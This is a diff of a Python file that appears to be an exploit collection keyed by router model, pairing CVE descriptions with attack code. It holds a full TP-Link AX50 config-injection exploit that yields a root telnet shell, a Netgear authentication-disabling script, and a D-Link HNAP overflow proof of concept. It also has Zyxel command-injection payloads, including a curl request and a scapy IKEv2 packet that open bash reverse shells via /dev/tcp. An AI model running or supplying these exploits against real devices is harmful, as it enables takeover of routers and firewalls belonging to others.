\'<password>X</password>\n\'\n\t\tpayload += \'<ip_source>script</ip_source>\n\'\n\t\tpayload += \'<ip_script>%s</ip_script>\n\' % (command.replace(\'<\',\'&lt;\').replace(\'&\',\'&amp;\'))\n\t\tpayload += \'<interface>internet</interface>\n\' # not worked for other interfaces\n\t\tpayload += \'<retry_interval>5</retry_interval>\n\'\n\t\tpayload += \'<retry_unit>seconds</retry_unit>\n\'\n\t\tpayload += \'<retry_times>3</retry_times>\n\'\n\t\tpayload += \'<check_interval>12</check_interval>\n\'\n\t\tpayload += \'<check_unit>hours</check_unit>\n\'\n\t\tpayload += \'<force_interval>30</force_interval>\n\'\n\t\tpayload += \'<force_unit>days</force_unit>\n\'\n\t\tpayload += \'</service>\n\'\n\n\t\tif \'<service name="exploit">\' in xml_content:\n\t\t\txml_content = re.sub(r\'<service name="exploit">[\\s\\S]+?</service>\n</ddns>\', \'%s</ddns>\'%(payload), xml_content, 1)\n\t\telse:\n\t\t\txml_content = xml_content.replace(\'</service>\n</ddns>\', \'</service>\n%s</ddns>\'%(payload), 1)\n\t\twith open(xml_path, \'w\') as f:\n\t\t\tf.write(xml_content)\n\n\n\narg_parser = argparse.ArgumentParser()\narg_parser.add_argument(\'-t\', metavar=\'target\', help=\'ip address of tp-link router\', required=True)\narg_parser.add_argument(\'-p\', metavar=\'password\', required=True)\narg_parser.add_argument(\'-b\', action=\'store_true\', help=\'only backup and decrypt config\')\narg_parser.add_argument(\'-r\', metavar=\'backup_directory\', help=\'only encrypt and restore directory with decrypted config\')\narg_parser.add_argument(\'-c\', metavar=\'cmd\', default=\'/usr/sbin/telnetd -l /bin/login.sh\', help=\'command to execute\')\nargs = arg_parser.parse_args()\n\nclient = WebClient(args.t, args.p)\nparser = None\n\nif not args.r:\n\tprint(\'[*] downloading config file ...\')\n\tfilepath = client.download_request(\'/admin/firmware?form=config_multipart\', {\'operation\':\'backup\'})\n\tif not filepath:\n\t\tsys.exit(-1)\n\n\tprint(\'[*] decrypting config file "%s" ...\'%(filepath))\n\tparser = BackupParser(filepath)\n\tparser.decrypt_config()\n\tprint(\'[+] successfully decrypted into directory "%s"\'%(parser.decrypted_path))\n\nif not args.b and not args.r:\n\tfilepath = \'%s_modified\'%(parser.decrypted_path)\n\tos.rename(parser.decrypted_path, filepath)\n\tparser.decrypted_path = os.path.abspath(filepath)\n\tparser.encrypted_path = \'%s.bin\'%(filepath)\n\tparser.modify_config(args.c)\n\tprint(\'[+] modified directory with decrypted config "%s" ...\'%(parser.decrypted_path))\n\nif not args.b:\n\tif parser is None:\n\t\tparser = BackupParser(\'%s.bin\'%(args.r.rstrip(\'/\')))\n\tprint(\'[*] encrypting directory with modified config "%s" ...\'%(parser.decrypted_path))\n\tparser.encrypt_config()\n\tdata = client.basic_request(\'/admin/firmware?form=config_multipart\', {\'operation\':\'read\'})\n\ttimeout = data[\'data\'][\'totaltime\'] if data[\'success\'] else 180\n\tprint(\'[*] uploading modified config file "%s"\'%(parser.encrypted_path))\n\tdata = client.basic_request(\'/admin/firmware?form=config_multipart\', {\'operation\':\'restore\'}, {\'archive\':open(parser.encrypted_path,\'rb\')})\n\tif not data[\'success\']:\n\t\tprint(\'[!] unexpected response\')\n\t\tprint(data)\n\t\tsys.exit(-1)\n\n\tprint(\'[+] config file successfully uploaded\')\n\tprint(\'[*] router will reboot in few seconds... when it becomes online again (few minutes), try "telnet %s" and enjoy root shell !!!\'%(args.t)\n']
+["In TP-Link Router AX50 firmware 210730 and older, import of a malicious backup file via web interface can lead to remote code execution due to improper validation.\n['http://packetstormsecurity.com/files/167522/TP-Link-AX50-Remote-Code-Execution.html', 'http://tp-link.com', 'https://github.com/aaronsvk', 'https://github.com/aaronsvk/CVE-2022-30075', 'https://www.exploit-db.com/exploits/50962']", '\n#!/usr/bin/python3\n# Exploit Title: TP-Link Routers - Authenticated Remote Code Execution\n# Exploit Author: Tomas Melicher\n# Technical Details: https://github.com/aaronsvk/CVE-2022-30075\n# Date: 2022-06-08\n# Vendor Homepage: https://www.tp-link.com/\n# Tested On: Tp-Link Archer AX50\n# Vulnerability Description:\n#   Remote Code Execution via importing malicious config file\n\nimport argparse # pip install argparse\nimport requests # pip install requests\nimport binascii, base64, os, re, json, sys, time, math, random, hashlib\nimport tarfile, zlib\nfrom Crypto.Cipher import AES, PKCS1_v1_5, PKCS1_OAEP # pip install pycryptodome\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Random import get_random_bytes\nfrom urllib.parse import urlencode\n\nclass WebClient(object):\n\n\tdef __init__(self, target, password):\n\t\tself.target = target\n\t\tself.password = password.encode(\'utf-8\')\n\t\tself.password_hash = hashlib.md5((\'admin%s\'%password).encode(\'utf-8\')).hexdigest().encode(\'utf-8\')\n\t\tself.aes_key = (str(time.time()) + str(random.random())).replace(\'.\',\'\')[0:AES.block_size].encode(\'utf-8\')\n\t\tself.aes_iv = (str(time.time()) + str(random.random())).replace(\'.\',\'\')[0:AES.block_size].encode(\'utf-8\')\n\n\t\tself.stok = \'\'\n\t\tself.session = requests.Session()\n\n\t\tdata = self.basic_request(\'/login?form=auth\', {\'operation\':\'read\'})\n\t\tif data[\'success\'] != True:\n\t\t\tprint(\'[!] unsupported router\')\n\t\t\treturn\n\t\tself.sign_rsa_n = int(data[\'data\'][\'key\'][0], 16)\n\t\tself.sign_rsa_e = int(data[\'data\'][\'key\'][1], 16)\n\t\tself.seq = data[\'data\'][\'seq\']\n\n\t\tdata = self.basic_request(\'/login?form=keys\', {\'operation\':\'read\'})\n\t\tself.password_rsa_n = int(data[\'data\'][\'password\'][0], 16)\n\t\tself.password_rsa_e = int(data[\'data\'][\'password\'][1], 16)\n\n\t\tself.stok = self.login()\n\n\n\tdef aes_encrypt(self, aes_key, aes_iv, aes_block_size, plaintext):\n\t\tcipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)\n\t\tplaintext_padded = pad(plaintext, aes_block_size)\n\t\treturn cipher.encrypt(plaintext_padded)\n\n\n\tdef aes_decrypt(self, aes_key, aes_iv, aes_block_size, ciphertext):\n\t\tcipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)\n\t\tplaintext_padded = cipher.decrypt(ciphertext)\n\t\tplaintext = unpad(plaintext_padded, aes_block_size)\n\t\treturn plaintext\n\n\n\tdef rsa_encrypt(self, n, e, plaintext):\n\t\tpublic_key = RSA.construct((n, e)).publickey()\n\t\tencryptor = PKCS1_v1_5.new(public_key)\n\t\tblock_size = int(public_key.n.bit_length()/8) - 11\n\t\tencrypted_text = \'\'\n\t\tfor i in range(0, len(plaintext), block_size):\n\t\t\tencrypted_text += encryptor.encrypt(plaintext[i:i+block_size]).hex()\n\t\treturn encrypted_text\n\n\n\tdef download_request(self, url, post_data):\n\t\tres = self.session.post(\'http://%s/cgi-bin/luci/;stok=%s%s\'%(self.target,self.stok,url), data=post_data, stream=True)\n\t\tfilepath = os.getcwd()+\'/\'+re.findall(r\'(?<=filename=")[^"]+\', res.headers[\'Content-Disposition\'])[0]\n\t\tif os.path.exists(filepath):\n\t\t\treturn\n\t\twith open(filepath, \'wb\') as f:\n\t\t\tfor chunk in res.iter_content(chunk_size=4096):\n\t\t\t\tf.write(chunk)\n\t\treturn filepath\n\n\n\tdef basic_request(self, url, post_data, files_data={}):\n\t\tres = self.session.post(\'http://%s/cgi-bin/luci/;stok=%s%s\'%(self.target,self.stok,url), data=post_data, files=files_data)\n\t\treturn json.loads(res.content)\n\n\n\tdef encrypted_request(self, url, post_data):\n\t\tserialized_data = urlencode(post_data)\n\t\tencrypted_data = self.aes_encrypt(self.aes_key, self.aes_iv, AES.block_size, serialized_data.encode(\'utf-8\'))\n\t\tencrypted_data = base64.b64encode(encrypted_data)\n\n\t\tsignature = (\'k=%s&i=%s&h=%s&s=%d\'.encode(\'utf-8\')) % (self.aes_key, self.aes_iv, self.password_hash, self.seq+len(encrypted_data))\n\t\tencrypted_signature = self.rsa_encrypt(self.sign_rsa_n, self.sign_rsa_e, signature)\n\n\t\tres = self.session.post(\'http://%s/cgi-bin/luci/;stok=%s%s\'%(self.target,self.stok,url), data={\'sign\':encrypted_signature, \'data\':encrypted_data}) # order of params is important\n\t\tif(res.status_code != 200):\n\t\t\tprint(\'[!] url "%s" returned unexpected status code\'%(url))\n\t\t\treturn\n\t\tencrypted_data = json.loads(res.content)\n\t\tencrypted_data = base64.b64decode(encrypted_data[\'data\'])\n\t\tdata = self.aes_decrypt(self.aes_key, self.aes_iv, AES.block_size, encrypted_data)\n\t\treturn json.loads(data)\n\n\n\tdef login(self):\n\t\tpost_data = {\'operation\':\'login\', \'password\':self.rsa_encrypt(self.password_rsa_n, self.password_rsa_e, self.password)}\n\t\tdata = self.encrypted_request(\'/login?form=login\', post_data)\n\t\tif data[\'success\'] != True:\n\t\t\tprint(\'[!] login failed\')\n\t\t\treturn\n\t\tprint(\'[+] logged in, received token (stok): %s\'%(data[\'data\'][\'stok\']))\n\t\treturn data[\'data\'][\'stok\']\n\n\n\nclass BackupParser(object):\n\n\tdef __init__(self, filepath):\n\t\tself.encrypted_path = os.path.abspath(filepath)\n\t\tself.decrypted_path = os.path.splitext(filepath)[0]\n\n\t\tself.aes_key = bytes.fromhex(\'2EB38F7EC41D4B8E1422805BCD5F740BC3B95BE163E39D67579EB344427F7836\') # strings ./squashfs-root/usr/lib/lua/luci/model/crypto.lua\n\t\tself.iv = bytes.fromhex(\'360028C9064242F81074F4C127D299F6\') # strings ./squashfs-root/usr/lib/lua/luci/model/crypto.lua\n\n\n\tdef aes_encrypt(self, aes_key, aes_iv, aes_block_size, plaintext):\n\t\tcipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)\n\t\tplaintext_padded = pad(plaintext, aes_block_size)\n\t\treturn cipher.encrypt(plaintext_padded)\n\n\n\tdef aes_decrypt(self, aes_key, aes_iv, aes_block_size, ciphertext):\n\t\tcipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)\n\t\tplaintext_padded = cipher.decrypt(ciphertext)\n\t\tplaintext = unpad(plaintext_padded, aes_block_size)\n\t\treturn plaintext\n\n\n\tdef encrypt_config(self):\n\t\tif not os.path.isdir(self.decrypted_path):\n\t\t\tprint(\'[!] invalid directory "%s"\'%(self.decrypted_path))\n\t\t\treturn\n\n\t\t# encrypt, compress each .xml using zlib and add them to tar archive\n\t\twith tarfile.open(\'%s/data.tar\'%(self.decrypted_path), \'w\') as tar:\n\t\t\tfor filename in os.listdir(self.decrypted_path):\n\t\t\t\tbasename,ext = os.path.splitext(filename)\n\t\t\t\tif ext == \'.xml\':\n\t\t\t\t\txml_path = \'%s/%s\'%(self.decrypted_path,filename)\n\t\t\t\t\tbin_path = \'%s/%s.bin\'%(self.decrypted_path,basename)\n\t\t\t\t\twith open(xml_path, \'rb\') as f:\n\t\t\t\t\t\tplaintext = f.read()\n\t\t\t\t\tif len(plaintext) == 0:\n\t\t\t\t\t\tf = open(bin_path, \'w\')\n\t\t\t\t\t\tf.close()\n\t\t\t\t\telse:\n\t\t\t\t\t\tcompressed = zlib.compress(plaintext)\n\t\t\t\t\t\tencrypted = self.aes_encrypt(self.aes_key, self.iv, AES.block_size, compressed)\n\t\t\t\t\t\twith open(bin_path, \'wb\') as f:\n\t\t\t\t\t\t\tf.write(encrypted)\n\t\t\t\t\ttar.add(bin_path, os.path.basename(bin_path))\n\t\t\t\t\tos.unlink(bin_path)\n\t\t# compress tar archive using zlib and encrypt\n\t\twith open(\'%s/md5_sum\'%(self.decrypted_path), \'rb\') as f1, open(\'%s/data.tar\'%(self.decrypted_path), \'rb\') as f2:\n\t\t\tcompressed = zlib.compress(f1.read()+f2.read())\n\t\tencrypted = self.aes_encrypt(self.aes_key, self.iv, AES.block_size, compressed)\n\t\t# write into final config file\n\t\twith open(\'%s\'%(self.encrypted_path), \'wb\') as f:\n\t\t\tf.write(encrypted)\n\t\tos.unlink(\'%s/data.tar\'%(self.decrypted_path))\n\n\n\tdef decrypt_config(self):\n\t\tif not os.path.isfile(self.encrypted_path):\n\t\t\tprint(\'[!] invalid file "%s"\'%(self.encrypted_path))\n\t\t\treturn\n\n\t\t# decrypt and decompress config file\n\t\twith open(self.encrypted_path, \'rb\') as f:\n\t\t\tdecrypted = self.aes_decrypt(self.aes_key, self.iv, AES.block_size, f.read())\n\t\tdecompressed = zlib.decompress(decrypted)\n\t\tos.mkdir(self.decrypted_path)\n\t\t# store decrypted data into files\n\t\twith open(\'%s/md5_sum\'%(self.decrypted_path), \'wb\') as f:\n\t\t\tf.write(decompressed[0:16])\n\t\twith open(\'%s/data.tar\'%(self.decrypted_path), \'wb\') as f:\n\t\t\tf.write(decompressed[16:])\n\t\t# untar second part of decrypted data\n\t\twith tarfile.open(\'%s/data.tar\'%(self.decrypted_path), \'r\') as tar:\n\t\t\ttar.extractall(path=self.decrypted_path)\n\t\t# decrypt and decompress each .bin file from tar archive\n\t\tfor filename in os.listdir(self.decrypted_path):\n\t\t\tbasename,ext = os.path.splitext(filename)\n\t\t\tif ext == \'.bin\':\n\t\t\t\tbin_path = \'%s/%s\'%(self.decrypted_path,filename)\n\t\t\t\txml_path = \'%s/%s.xml\'%(self.decrypted_path,basename)\n\t\t\t\twith open(bin_path, \'rb\') as f:\n\t\t\t\t\tciphertext = f.read()\n\t\t\t\tos.unlink(bin_path)\n\t\t\t\tif len(ciphertext) == 0:\n\t\t\t\t\tf = open(xml_path, \'w\')\n\t\t\t\t\tf.close()\n\t\t\t\t\tcontinue\n\t\t\t\tdecrypted = self.aes_decrypt(self.aes_key, self.iv, AES.block_size, ciphertext)\n\t\t\t\tdecompressed = zlib.decompress(decrypted)\n\t\t\t\twith open(xml_path, \'wb\') as f:\n\t\t\t\t\tf.write(decompressed)\n\t\tos.unlink(\'%s/data.tar\'%(self.decrypted_path))\n\n\n\tdef modify_config(self, command):\n\t\txml_path = \'%s/ori-backup-user-config.xml\'%(self.decrypted_path)\n\t\tif not os.path.isfile(xml_path):\n\t\t\tprint(\'[!] invalid file "%s"\'%(xml_path))\n\t\t\treturn\n\n\t\twith open(xml_path, \'r\') as f:\n\t\t\txml_content = f.read()\n\n\t\t# https://openwrt.org/docs/guide-user/services/ddns/client#detecting_wan_ip_with_script\n\t\tpayload = \'<service name="exploit">\\n\'\n\t\tpayload += \'<enabled>on</enabled>\\n\'\n\t\tpayload += \'<update_url>http://127.0.0.1/</update_url>\\n\'\n\t\tpayload += \'<domain>x.example.org</domain>\\n\'\n\t\tpayload += \'<username>X</username>\\n\'\n\t\tpayload += \'<password>X</password>\\n\'\n\t\tpayload += \'<ip_source>script</ip_source>\\n\'\n\t\tpayload += \'<ip_script>%s</ip_script>\\n\' % (command.replace(\'<\',\'&lt;\').replace(\'&\',\'&amp;\'))\n\t\tpayload += \'<interface>internet</interface>\\n\' # not worked for other interfaces\n\t\tpayload += \'<retry_interval>5</retry_interval>\\n\'\n\t\tpayload += \'<retry_unit>seconds</retry_unit>\\n\'\n\t\tpayload += \'<retry_times>3</retry_times>\\n\'\n\t\tpayload += \'<check_interval>12</check_interval>\\n\'\n\t\tpayload += \'<check_unit>hours</check_unit>\\n\'\n\t\tpayload += \'<force_interval>30</force_interval>\\n\'\n\t\tpayload += \'<force_unit>days</force_unit>\\n\'\n\t\tpayload += \'</service>\\n\'\n\n\t\tif \'<service name="exploit">\' in xml_content:\n\t\t\txml_content = re.sub(r\'<service name="exploit">[\\s\\S]+?</service>\\n</ddns>\', \'%s</ddns>\'%(payload), xml_content, 1)\n\t\telse:\n\t\t\txml_content = xml_content.replace(\'</service>\\n</ddns>\', \'</service>\\n%s</ddns>\'%(payload), 1)\n\t\twith open(xml_path, \'w\') as f:\n\t\t\tf.write(xml_content)\n\n\n\narg_parser = argparse.ArgumentParser()\narg_parser.add_argument(\'-t\', metavar=\'target\', help=\'ip address of tp-link router\', required=True)\narg_parser.add_argument(\'-p\', metavar=\'password\', required=True)\narg_parser.add_argument(\'-b\', action=\'store_true\', help=\'only backup and decrypt config\')\narg_parser.add_argument(\'-r\', metavar=\'backup_directory\', help=\'only encrypt and restore directory with decrypted config\')\narg_parser.add_argument(\'-c\', metavar=\'cmd\', default=\'/usr/sbin/telnetd -l /bin/login.sh\', help=\'command to execute\')\nargs = arg_parser.parse_args()\n\nclient = WebClient(args.t, args.p)\nparser = None\n\nif not args.r:\n\tprint(\'[*] downloading config file ...\')\n\tfilepath = client.download_request(\'/admin/firmware?form=config_multipart\', {\'operation\':\'backup\'})\n\tif not filepath:\n\t\tsys.exit(-1)\n\n\tprint(\'[*] decrypting config file "%s" ...\'%(filepath))\n\tparser = BackupParser(filepath)\n\tparser.decrypt_config()\n\tprint(\'[+] successfully decrypted into directory "%s"\'%(parser.decrypted_path))\n\nif not args.b and not args.r:\n\tfilepath = \'%s_modified\'%(parser.decrypted_path)\n\tos.rename(parser.decrypted_path, filepath)\n\tparser.decrypted_path = os.path.abspath(filepath)\n\tparser.encrypted_path = \'%s.bin\'%(filepath)\n\tparser.modify_config(args.c)\n\tprint(\'[+] modified directory with decrypted config "%s" ...\'%(parser.decrypted_path))\n\nif not args.b:\n\tif parser is None:\n\t\tparser = BackupParser(\'%s.bin\'%(args.r.rstrip(\'/\')))\n\tprint(\'[*] encrypting directory with modified config "%s" ...\'%(parser.decrypted_path))\n\tparser.encrypt_config()\n\tdata = client.basic_request(\'/admin/firmware?form=config_multipart\', {\'operation\':\'read\'})\n\ttimeout = data[\'data\'][\'totaltime\'] if data[\'success\'] else 180\n\tprint(\'[*] uploading modified config file "%s"\'%(parser.encrypted_path))\n\tdata = client.basic_request(\'/admin/firmware?form=config_multipart\', {\'operation\':\'restore\'}, {\'archive\':open(parser.encrypted_path,\'rb\')})\n\tif not data[\'success\']:\n\t\tprint(\'[!] unexpected response\')\n\t\tprint(data)\n\t\tsys.exit(-1)\n\n\tprint(\'[+] config file successfully uploaded\')\n\tprint(\'[*] router will reboot in few seconds... when it becomes online again (few minutes), try "telnet %s" and enjoy root shell !!!\'%(args.t))\n']
 }
 
 
 model_exp_dic["RT-AC68U"] = {
     "CVE-2018-1160":
 ["Netatalk before 3.1.12 is vulnerable to an out of bounds write in dsi_opensess.c. This is due to lack of bounds checking on attacker controlled data. A remote unauthenticated attacker can leverage this vulnerability to achieve arbitrary code execution.\n['http://packetstormsecurity.com/files/152440/QNAP-Netatalk-Authentication-Bypass.html', 'https://attachments.samba.org/attachment.cgi?id=14735', 'https://github.com/tenable/poc/tree/master/netatalk/cve_2018_1160/', 'https://www.tenable.com/security/research/tra-2018-48', 'http://www.securityfocus.com/bid/106301', 'https://www.debian.org/security/2018/dsa-4356', 'https://www.exploit-db.com/exploits/46034/', 'https://www.exploit-db.com/exploits/46048/', 'https://www.exploit-db.com/exploits/46675/']", '\nno\n']
 }
@@ -667,39 +738,39 @@
 	else:
 		vurl = url + 'genieDisableLanChanged.cgi?id=' + token
 
 	req = requests.post(vurl, verify=False)
 	time.sleep(1)
 	req = requests.post(vurl, verify=False)
 
-	print 'Authentication is disabled'
-	print 'Try: '+url+'BAS_basic.htm'
-	print 'Try: '+url+'MNU_accessPassword_recovered.htm'
+	print('Authentication is disabled')
+	print('Try: '+url+'BAS_basic.htm')
+	print('Try: '+url+'MNU_accessPassword_recovered.htm')
 
 def open_auth(token,url):
 
 	if token == "Token maybe unnecessary":
 		vurl = url + 'geniemanual.cgi'
 	else:
 		vurl = url + 'geniemanual.cgi?id=' + token
 
 	req = requests.post(vurl, verify=False)
 	time.sleep(1)
 	req = requests.post(vurl, verify=False)
 
-	print 'Authentication is enabled'
-	print 'Try: '+url+'BAS_basic.htm'
-	print 'Try: '+url+'MNU_accessPassword_recovered.htm'
+	print('Authentication is enabled')
+	print('Try: '+url+'BAS_basic.htm')
+	print('Try: '+url+'MNU_accessPassword_recovered.htm')
 
 
 if __name__ == '__main__':
 	if len(sys.argv) != 4:
-		print 'usage:'
-		print '1.python router.py ip port openauth'
-		print '2.python router.py ip port closeauth'
+		print('usage:')
+		print('1.python router.py ip port openauth')
+		print('2.python router.py ip port closeauth')
 		os._exit(0)
 
 	ip=sys.argv[1]
 	port=sys.argv[2]
 	func=sys.argv[3]
 
 	
@@ -709,17 +780,17 @@
 		token=get_token(url)
 		open_auth(token,url)
 	elif func=='closeauth':
 		url=get_url(ip, port)
 		token=get_token(url)
 		close_auth(token,url)
 	else:
-		print 'usage:'
-		print '1.python router.py ip port openauth'
-		print '2.python router.py ip port closeauth'
+		print('usage:')
+		print('1.python router.py ip port openauth')
+		print('2.python router.py ip port closeauth')
 		os._exit(0)
 """
 ],
     "CVE-2021-34991":
 ["This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of NETGEAR R6400v2 1.0.4.106_10.0.80 routers. Authentication is not required to exploit this vulnerability. The specific flaw exists within the UPnP service, which listens on TCP port 5000 by default. When parsing the uuid request header, the process does not properly validate the length of user-supplied data prior to copying it to a fixed-length stack-based buffer. An attacker can leverage this vulnerability to execute code in the context of root. Was ZDI-CAN-14110.['https://kb.netgear.com/000064361/Security-Advisory-for-Pre-Authentication-Buffer-Overflow-on-Multiple-Products-PSV-2021-0168'\n'https://www.zerodayinitiative.com/advisories/ZDI-21-1303/']",
 """
 Not included temporarily
@@ -745,15 +816,32 @@
 model_exp_dic["Zyxel_USG_FLEX_500"] = {
     "CVE-2022-30525":
 ["A OS command injection vulnerability in the CGI program of Zyxel USG FLEX 100(W) firmware versions 5.00 through 5.21 Patch 1, USG FLEX 200 firmware versions 5.00 through 5.21 Patch 1, USG FLEX 500 firmware versions 5.00 through 5.21 Patch 1, USG FLEX 700 firmware versions 5.00 through 5.21 Patch 1, USG FLEX 50(W) firmware versions 5.10 through 5.21 Patch 1, USG20(W)-VPN firmware versions 5.10 through 5.21 Patch 1, ATP series firmware versions 5.10 through 5.21 Patch 1, VPN series firmware versions 4.60 through 5.21 Patch 1, which could allow an attacker to modify specific files and then execute some OS commands on a vulnerable device.\n['http://packetstormsecurity.com/files/167176/Zyxel-Remote-Command-Execution.html', 'http://packetstormsecurity.com/files/167182/Zyxel-Firewall-ZTP-Unauthenticated-Command-Injection.html', 'http://packetstormsecurity.com/files/167372/Zyxel-USG-FLEX-5.21-Command-Injection.html', 'http://packetstormsecurity.com/files/168202/Zyxel-Firewall-SUID-Binary-Privilege-Escalation.html', 'https://www.zyxel.com/support/Zyxel-security-advisory-for-OS-command-injection-vulnerability-of-firewalls.shtml']", 
 """
 curl -kv --insecure -X POST -H "Content-Type: application/json" -d '{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged":"1","vlanid":"5","mtu":";bash -c \"bash -i &>/dev/tcp/127.0.0.1/8888 <&1;\";","data":"hi"}' https://74.105.155.163//ztp/cgi-bin/handler
 \nPOST /ztp/cgi-bin/handler HTTP/1.1\nHost: host\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\nContent-Type: application/json\nConnection: close\nContent-Length: 165\n\n{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged"\n:"1","vlanid":"5","mtu":";Command;","data":"hi"}\n
 """
-]
+],
+    "CVE-2023-28771":
+["Improper error message handling in Zyxel ZyWALL/USG series firmware versions 4.60 through 4.73, VPN series firmware versions 4.60 through 5.35, USG FLEX series firmware versions 4.60 through 5.35, and ATP series firmware versions 4.60 through 5.35, which could allow an unauthenticated attacker to execute some OS commands remotely by sending crafted packets to an affected device.\n['https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-remote-command-injection-vulnerability-of-firewalls']",
+ """
+#!/usr/bin/python3
+import sys
+from scapy.all import *
+
+load_contrib('ikev2')
+
+cmd = "\\";bash -c \\"exec bash -i &>/dev/tcp/" + sys.argv[2] + "/" + sys.argv[3] + " <&1;\\";echo -n \\""
+
+packet = IP(dst = sys.argv[1]) / UDP(dport = 500) / IKEv2(init_SPI = RandString(8), next_payload = 'Notify', exch_type = 'IKE_SA_INIT', flags='Initiator') / IKEv2_payload_Notify(next_payload = 'Nonce', type = 14, load = "HAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXB" + cmd) / IKEv2_payload_Nonce(next_payload = 'None', load = RandString(68))
+
+send(packet)
+
+ """
+ ]
 }
 
 model_exp_dic["Buffalo_WSR-2533DHPL"] = {
     "CVE-2021-38703":
 ["Wireless devices running certain Arcadyan-derived firmware (such as KPN Experia WiFi 1.00.15) do not properly sanitise user input to the syslog configuration form. An authenticated remote attacker could leverage this to alter the device configuration and achieve remote code execution. This can be exploited in conjunction with CVE-2021-20090.\n['https://7bits.nl/journal/posts/cve-2021-38703-kpn-experia-wifi-root-shell/'\n'https://www.kpnwebshop.com/modems-routers/producten/experia-wifi/2']", 
 """
 action=syslog_ng_restart
@@ -795,50 +883,50 @@
 
 model_exp_dic["DIR-878"] = {
     "CVE-2019-8316":
         ["An issue was discovered on D-Link DIR-878 devices with firmware 1.12A1. This issue is a Command Injection allowing a remote attacker to execute arbitrary code, and get a root shell. A command Injection vulnerability allows attackers to execute arbitrary OS commands via a crafted /HNAP1 POST request. This occurs when any HNAP API function triggers a call to the system function with untrusted input from the request body for the SetWebFilterSettings API function, as demonstrated by shell metacharacters in the WebFilterURLs field.",""],
     "CVE-2019-9125":
         ["An issue was discovered on D-Link DIR-878 1.12B01 devices. Because strncpy is misused, there is a stack-based buffer overflow vulnerability that does not require authentication via the HNAP_AUTH HTTP header.\n['https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10157'\n'https://www.zerodayinitiative.com/advisories/ZDI-20-267/']",
         """
+
 import requests
 import sys
 import struct
 import time
 from pwn import *
 
 def syscmd1(a):
     data='<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>request</Action><Username>Admin</Username><LoginPassword></LoginPassword><Captcha></Captcha></Login></soap:Body></soap:Envelope>'
-
-    p=remote('ip'port)
+    p=remote('x.x.x.x',port)
     z=len(data)
     payload=''
-    payload+='POST /HNAP1/ HTTP/1.1\\r\\n'
-    payload+='Host: 192.168.0.1\\r\\n'
-    payload+='Connection: close\\r\\n'
-    payload+='HNAP_AUTH: EC502BB60841C94D843DB3E7E3B451BE '+a+'\\r\\n'
-    payload+='Accept-Encoding: gzip, deflate\\r\\n'
-    payload+='Accept: */*\\r\\n'
-    payload+='Origin: http://192.168.0.1\\r\\n'
+    payload+='POST /HNAP1/ HTTP/1.1\r\n'
+    payload+='Host: 192.168.0.1\r\n'
+    payload+='Connection: close\r\n'
+    payload+='HNAP_AUTH: EC502BB60841C94D843DB3E7E3B451BE '+a+'\r\n'
+    payload+='Accept-Encoding: gzip, deflate\r\n'
+    payload+='Accept: */*\r\n'
+    payload+='Origin: http://192.168.0.1\r\n'
     payload+='SOAPAction: "http://purenetworks.com/HNAP1/Login"'
-    payload+='User-Agent: python-requests/2.18.4\\r\\n'
-    payload+='Content-Length: '+str(z)+'\\r\\n'
-    payload+='Content-Type: text/xml; charset=UTF-8\\r\\n'
-    payload+='Referer: http://ip/info/Login.html\\r\\n'
-    payload+='Accept-Language: zh-CN,zh;q=0.9\\r\\n'
-    payload+='X-Requested-With: XMLHttpRequest\\r\\n'
-    payload+='Cookie: Hm_lvt_39dcd5bd05965dcfa70b1d2457c6dcae=1547191507,1547456131; uid=null\\r\\n'
-    payload+='\\r\\n'
+    payload+='User-Agent: python-requests/2.18.4\r\n'
+    payload+='Content-Length: '+str(z)+'\r\n'
+    payload+='Content-Type: text/xml; charset=UTF-8\r\n'
+    payload+='Referer: http://ip/info/Login.html\r\n'
+    payload+='Accept-Language: zh-CN,zh;q=0.9\r\n'
+    payload+='X-Requested-With: XMLHttpRequest\r\n'
+    payload+='Cookie: Hm_lvt_39dcd5bd05965dcfa70b1d2457c6dcae=1547191507,1547456131; uid=null\r\n'
+    payload+='\r\n'
     payload+=data
     p.send(payload)
-    print p.recv(1024)
+    print(p.recv(1024))
     p.close()
 
 if __name__ == "__main__":
-            payload='A'*0x400
-            syscmd1(payload)
+    payload='A'*0x400
+    syscmd1(payload)
         """
         ]
 }
 
 model_exp_dic["TPLINK_Archer_A7_V5"] = {
     "CVE-2021-42232":
         ["TP-Link Archer A7 Archer A7(US)_V5_210519 is affected by a command injection vulnerability in /usr/bin/tddp. The vulnerability is caused by the program taking part of the received data packet as part of the command. This will cause an attacker to execute arbitrary commands on the router.", 
@@ -1464,15 +1552,14 @@
     ]
 }
 
 model_exp_dic["Netgear_WNDR3400v2"] = {
         "CVE-2019-17372":
 ["There is a large number of netgear devices with a genieDisableLanChanged.cgi page that can be accessed without authorization. After accessing this page, the device's authentication function will be turned off. Some devices need to set the correct token and send a POST type request to trigger the vulnerability.",
 """
-
 #!/usr/bin/env python
 
 import sys
 import time
 import os
 import requests
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -1518,39 +1605,39 @@
 	else:
 		vurl = url + 'genieDisableLanChanged.cgi?id=' + token
 
 	req = requests.post(vurl, verify=False)
 	time.sleep(1)
 	req = requests.post(vurl, verify=False)
 
-	print 'Authentication is disabled'
-	print 'Try: '+url+'BAS_basic.htm'
-	print 'Try: '+url+'MNU_accessPassword_recovered.htm'
+	print('Authentication is disabled')
+	print('Try: '+url+'BAS_basic.htm')
+	print('Try: '+url+'MNU_accessPassword_recovered.htm')
 
 def open_auth(token,url):
 
 	if token == "Token maybe unnecessary":
